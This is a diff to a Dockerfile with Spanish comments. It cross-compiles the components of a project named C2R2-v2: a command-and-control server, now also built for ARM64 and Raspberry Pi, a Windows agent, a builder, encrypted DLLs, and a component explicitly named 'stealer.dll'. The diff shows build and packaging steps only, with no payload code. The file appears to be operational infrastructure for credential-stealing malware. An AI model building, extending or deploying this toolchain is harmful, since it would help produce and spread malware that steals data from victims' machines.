@@ -1,19 +1,25 @@
 # Dockerfile para compilar todos los componentes de C2R2-v2
-# Genera binarios listos para usar: servidor, agente, builder, y DLLs
+# Genera binarios listos para usar: 
+#   - Servidor (x86_64 Linux y ARM64 para Raspberry Pi)
+#   - Agente Windows
+#   - Builder y DLLs encriptadas
 
 FROM rust:1.90-slim
 
-# Instalar dependencias para compilación cruzada a Windows
+# Instalar dependencias para compilación cruzada a Windows y ARM
 RUN apt-get update && apt-get install -y \
     mingw-w64 \
     build-essential \
+    gcc-aarch64-linux-gnu \
+    g++-aarch64-linux-gnu \
     && rm -rf /var/lib/apt/lists/*
 
 # Agregar target de Windows
 RUN rustup target add x86_64-pc-windows-gnu
 
-# Agregar target de Linux para el servidor
+# Agregar targets de Linux para el servidor
 RUN rustup target add x86_64-unknown-linux-gnu
+RUN rustup target add aarch64-unknown-linux-gnu
 
 # Crear directorio de trabajo
 WORKDIR /workspace
@@ -30,12 +36,20 @@ ARG PRODUCTION_MODE=false
 # Script de compilación
 RUN mkdir -p /build_output
 
-# 1. Compilar el servidor (Linux)
-RUN echo "🔨 Compilando servidor C2R2..." && \
+# 1a. Compilar el servidor (Linux x86_64)
+RUN echo "🔨 Compilando servidor C2R2 (x86_64)..." && \
     cargo build --release --target x86_64-unknown-linux-gnu --package c2r2-server && \
     cp target/x86_64-unknown-linux-gnu/release/c2r2-server /build_output/c2r2-server && \
     chmod +x /build_output/c2r2-server && \
-    echo "✅ Servidor compilado: /build_output/c2r2-server"
+    echo "✅ Servidor x86_64 compilado: /build_output/c2r2-server"
+
+# 1b. Compilar el servidor (ARM64 - Raspberry Pi)
+RUN echo "🔨 Compilando servidor C2R2 (ARM64 - Raspberry Pi)..." && \
+    CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc \
+    cargo build --release --target aarch64-unknown-linux-gnu --package c2r2-server && \
+    cp target/aarch64-unknown-linux-gnu/release/c2r2-server /build_output/c2r2-server-arm64 && \
+    chmod +x /build_output/c2r2-server-arm64 && \
+    echo "✅ Servidor ARM64 compilado: /build_output/c2r2-server-arm64"
 
 # 2. Compilar stealer DLL
 RUN echo "🔨 Compilando stealer.dll..." && \
@@ -92,6 +106,9 @@ RUN echo "📦 RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
     echo "" >> /build_output/BUILD_INFO.txt && \
     echo "Servidor C2:" >> /build_output/BUILD_INFO.txt && \
     ls -lh /build_output/c2r2-server >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "Servidor C2R2 (ARM64 - Raspberry Pi):" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/c2r2-server-arm64 >> /build_output/BUILD_INFO.txt && \
     echo "" >> /build_output/BUILD_INFO.txt && \
     echo "Agente Windows:" >> /build_output/BUILD_INFO.txt && \
     ls -lh /build_output/${AGENT_NAME}.exe >> /build_output/BUILD_INFO.txt && \
